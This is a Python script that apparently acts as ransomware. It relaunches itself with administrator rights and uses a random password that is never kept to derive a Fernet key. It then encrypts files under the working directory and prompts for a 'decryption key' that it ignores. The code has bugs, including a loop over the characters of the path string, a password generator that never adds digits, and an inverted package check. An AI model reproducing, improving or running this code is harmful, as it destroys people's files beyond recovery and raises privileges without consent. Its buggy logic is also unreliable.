import pathlib
import secrets
import os
import base64
import getpass
import random
import pyuac
import subprocess
import sys
import importlib.util

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
def generate_salt(size=16):
    return secrets.token_bytes(size)
  
def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
  
def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()
  
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    
    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key)
  
def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)
      
def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            # encrypt the file
            try:
              encrypt(child, key)
            except:
              print("Permission to"+ str(child) +"Denied.")
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_folder(foldername, key):
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)

def passgen(chars):
  letters=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
  numbers=[1,2,3,4,5,6,7,8,9]
  string=""
  for x in range(chars):
    type=random.randrange(1,2)
    if type==1:
      index=random.randrange(1,26)
      character=letters[(index-1)]
      string=string+character
    elif type==2:
      index=random.randrange(1,9)
      character=numbers[(index-1)]
      string=string+character
  return string

def getRoot():
  file_path = os.path.abspath(__file__)
  BASE_DIR = os.path.dirname(file_path)
  while (os.path.isdir(BASE_DIR)):
      if (BASE_DIR==os.path.dirname(BASE_DIR)):
          break
      else:
          BASE_DIR=os.path.dirname(BASE_DIR)
  return BASE_DIR

def main():
  root=os.getcwd()
  password=passgen(random.randrange(8,12))
  key=generate_key(password)
  base=root
  for file in base:
    if os.path.isfile(file):
      print(file +"IS NOW ENCRYPTED")
      try:
        encrypt(file,key)
      except:
        print("UwU")
    elif os.path.isdir(file):
      print(file +" IS NOW ENCRYPTED")
      encrypt_folder(file,key)
  decryption_key=input("ENTER DECRYPTION KEY: ")

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def checkPackage(packagename):
  name = packagename
  if name in sys.modules:
    print(f"{name!r} already in sys.modules")
  elif (spec := importlib.util.find_spec(name)) is not None:
    install(name)
    
if __name__ == "__main__":
    checkPackage("pyuac")
    checkPackage("pypiwin32")
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        pyuac.runAsAdmin()
        main()
    else:        
        main()  # Already an admin here.
input()
